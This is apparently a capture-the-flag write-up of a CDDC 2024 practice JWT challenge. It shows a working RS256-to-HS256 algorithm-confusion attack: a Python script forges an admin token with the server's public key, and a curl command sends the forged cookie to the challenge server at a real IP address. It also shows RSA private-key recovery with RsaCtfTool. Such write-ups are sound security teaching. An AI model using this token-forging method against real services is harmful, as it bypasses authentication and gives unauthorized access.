---
description: >-
  The Main challenge is from CDDC 2024 Practice Practice round. Go try it first
  before you read this.
---

# JWT Challenge

We have learnt about JWT, but what about the attack of it?

## Can you compromise this?

{% file src="../../.gitbook/assets/web4_so_dizzy.zip" %}

## Setup

```bash
# Unzip the file
unzip web4_so_dizzy.zip
cd web4_so_dizzy

# Start the flask server on your own host/VM
python -m main.py

# Now just use it the way you would a server :)

```

If CDDC practice machine is still up, here is the initial site:&#x20;

{% embed url="http://47.128.156.184:10008/" %}

<figure><img src="../../.gitbook/assets/Pasted image 20240506225257.png" alt=""><figcaption></figcaption></figure>

There are 2 options, to check in via admin or guest, when we click on either, we see this:&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20240506225244.png" alt=""><figcaption><p>A hint at the site you need to visit for token</p></figcaption></figure>

So visiting http://47.128.156.184:10008/getcookie will supply the user with a cookie:&#x20;

Guest Token:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.ATWEP-3TalFgZ0NavDYr8h7at_9n-jxo9nVNuLvMdIx5xKeTTvrAd9Z22vGh87MFXy5vBFfBG4h6b7_ef9yqzJpBy-mdFGNXkg8TbywVJ_bJDzNFcSfv02Sxya9L9Z_1LwACyKpZFVsFuqmltgImmMb07I0j1_J4NpwcnYDlbSev6nhLJ8prsXiIScXLLr4GRniIgkR8AwnI1pAbqb0RqxsC-cNTBbPrV7zcd3dg3X1ASbBdKLh-uCJhDAFUsEWd2eD5wm4EGCalocZLercz_sDGMF9MCUKKt2tlPnh5snCMd3VIYIsKIKaaxwqh2nTgjYQT2Qyt5UFmHKIvqWcr5g
```

Which is a [JWS](https://greenhat.gitbook.io/interview-bank/web/jwt/jws), and putting it in a [decoder](https://jwt.io/) can help us see it better.

Translates to:

```
Headers = {
  "alg": "RS256",
  "typ": "JWT"
}

Payload = {
  "user": "guest"
}

Signature = "ATWEP-3TalFgZ0NavDYr8h7at_9n-jxo9nVNuLvMdIx5xKeTTvrAd9Z22vGh87MFXy5vBFfBG4h6b7_ef9yqzJpBy-mdFGNXkg8TbywVJ_bJDzNFcSfv02Sxya9L9Z_1LwACyKpZFVsFuqmltgImmMb07I0j1_J4NpwcnYDlbSev6nhLJ8prsXiIScXLLr4GRniIgkR8AwnI1pAbqb0RqxsC-cNTBbPrV7zcd3dg3X1ASbBdKLh-uCJhDAFUsEWd2eD5wm4EGCalocZLercz_sDGMF9MCUKKt2tlPnh5snCMd3VIYIsKIKaaxwqh2nTgjYQT2Qyt5UFmHKIvqWcr5g"
```

We see the algo used was "RS256" which is RSA with SHA256, means the key is asymmetric.

We have a public key from http://47.128.156.184:10008/api/jwt

```
{"public_key":"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiErXyh99IXoui0ua+QeP\nESzg3AhM4euZ1+/WCOHTsyeiY65veUrFUENBAUk8xVkv8dDqabPD9YybWCDE75Fn\nZyKtVOUOtfAJNGRbcUApQgMdbh3gnNeC9wELbw2AjN/wQMuKpbWBdXq7KZ6Fe3FG\ncd+65CVNcKKIam3Y7S6vDnq5TBgDGc/D1nQnOIdh9D7Z7ndGzqPSen3HoMhiKZlw\n27Vguq7n0c7JRqzazy+hLWigCd8cUpiu+1ZadnqGWtOD3ts+pbWrc5Q0mPpmEXST\nKU8CtSSzNPTMhZrt9mCo/UyX8p3wz+M4t+qVMuHmqbA7TGzGiToXyYBXuUrbj+3v\nLQIDAQAB\n-----END PUBLIC KEY-----"}
```

Public key:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiErXyh99IXoui0ua+QeP
ESzg3AhM4euZ1+/WCOHTsyeiY65veUrFUENBAUk8xVkv8dDqabPD9YybWCDE75Fn
ZyKtVOUOtfAJNGRbcUApQgMdbh3gnNeC9wELbw2AjN/wQMuKpbWBdXq7KZ6Fe3FG
cd+65CVNcKKIam3Y7S6vDnq5TBgDGc/D1nQnOIdh9D7Z7ndGzqPSen3HoMhiKZlw
27Vguq7n0c7JRqzazy+hLWigCd8cUpiu+1ZadnqGWtOD3ts+pbWrc5Q0mPpmEXST
KU8CtSSzNPTMhZrt9mCo/UyX8p3wz+M4t+qVMuHmqbA7TGzGiToXyYBXuUrbj+3v
LQIDAQAB
-----END PUBLIC KEY-----
```

Checking the source code they provided, this is how the server side validates token, so do you see what is wrong with it?&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20240506231933 (1).png" alt=""><figcaption><p>From main.py</p></figcaption></figure>

There is no validation!

If anything is modified on the algo section of the Headers, the `jwt.decode` will process it using that algorithm, this vulnerability is important to note since we can technically just modify this field in the JWT using HMAC, resign the token with the public key, send it over, the server uses the public key to decrypt the signature, and see our information sent anyways.

Indicated in the documentation of this library is the following:\
"This decoding method is insecure. By default `jwt.decode` parses the alg header. This allows symmetric macs and asymmetric signatures. If both are allowed a signature bypass described in CVE-2016-10555 is possible."&#x20;

### For more information along with mitigation:&#x20;

{% embed url="https://docs.authlib.org/en/latest/jose/jwt.html" %}

We also need to modify the user from user to admin, we can achieve this using simple python code as follows:

```python
from authlib.jose import jwt

# Your public key
public_key = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAiErXyh99IXoui0ua+QeP\nESzg3AhM4euZ1+/WCOHTsyeiY65veUrFUENBAUk8xVkv8dDqabPD9YybWCDE75Fn\nZyKtVOUOtfAJNGRbcUApQgMdbh3gnNeC9wELbw2AjN/wQMuKpbWBdXq7KZ6Fe3FG\ncd+65CVNcKKIam3Y7S6vDnq5TBgDGc/D1nQnOIdh9D7Z7ndGzqPSen3HoMhiKZlw\n27Vguq7n0c7JRqzazy+hLWigCd8cUpiu+1ZadnqGWtOD3ts+pbWrc5Q0mPpmEXST\nKU8CtSSzNPTMhZrt9mCo/UyX8p3wz+M4t+qVMuHmqbA7TGzGiToXyYBXuUrbj+3v\nLQIDAQAB\n-----END PUBLIC KEY-----"

def gentoken(key):
    header = {"alg": "HS256"}
    payload = {"user": "admin"}
    token = jwt.encode(header, payload, key)
    return token

token = gentoken(public_key_pseudo)
print(token)
```

The output will be this token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.IX3MZqrvRdDMW00Il83c8KXuPRiXQ7rX5sq9-CqSWAY
```

Check with JWT burp extension to see if the signature is verified:&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20240506212518.png" alt=""><figcaption><p>Using JSON web Tokens extension of Burpsuite, we can verify our token is working</p></figcaption></figure>

Extension:

{% embed url="https://github.com/portswigger/json-web-tokens" %}

Since it is verified, there should be no issue on the server side, we can curl it to see our flag:

```bash
curl --cookie "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.IX3MZqrvRdDMW00Il83c8KXuPRiXQ7rX5sq9-CqSWAY" http://47.128.156.184:10008/post/1
```

And bypassed!

&#x20;![](<../../.gitbook/assets/Pasted image 20240506212454 - Copy (1).png>)

## HMAC Attack

If the situation was different, and the token was just using HMAC from the start, getting a hold of the symmetric key would mean game over for the server, since we would already be able to resign the JWT and send it to the server.

## Small key RSA SHA256

If the public key was not as big as the current, the private key could possibly be recovered using the RsaCtfTool

We try to get the private key from the public key

```bash
git clone https://github.com/RsaCtfTool/RsaCtfTool.git
cd RsaCtfTool 
pip3 install -r requirements.txt

python3 RsaCtfTool.py --publickey ../public.pem --private
```

If it is recoverable, the private key will show:&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20240506235237.png" alt=""><figcaption><p>Source: https://ctftime.org/writeup/30541</p></figcaption></figure>

Which you can use to resign the token after modification.

### Questions to ponder:

* If you were the developer, how would you have better secured the code, give a simple snippet to show how you would have done it.
* What other forms of JWT implementations are there, and how are they better than just implementing JWT by itself?

### Conclusion

It is important to use validation for all your methods with regards to authentication, and use of strong keys are recommended, and do not expose your keys easily.

#### Author: [`Ninjarku`](https://github.com/Ninjarku)🐱‍👤
